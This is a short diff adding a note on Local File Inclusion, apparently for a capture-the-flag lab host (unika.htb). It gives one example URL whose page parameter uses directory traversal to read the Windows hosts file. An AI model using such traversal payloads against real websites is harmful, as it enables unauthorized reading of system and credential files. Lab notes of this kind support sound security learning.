@@ -1,0 +1,4 @@
+Local File Include (LFI)
+
+Windows example on page parameter
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
